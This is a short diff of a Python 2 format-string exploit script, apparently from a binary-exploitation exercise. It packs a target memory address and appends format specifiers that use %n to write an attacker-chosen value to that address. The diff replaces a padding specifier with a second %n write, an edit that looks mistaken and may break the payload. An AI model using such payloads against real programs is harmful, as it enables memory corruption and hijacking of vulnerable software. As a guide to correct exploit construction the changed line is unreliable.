@@ -5,4 +5,4 @@
 import struct
 
 target_address = struct.pack ("I", 0x8049810)
-print target_address + "%16930112p" + "%12$n"
+print target_address + "%16930112n" + "%12$n"
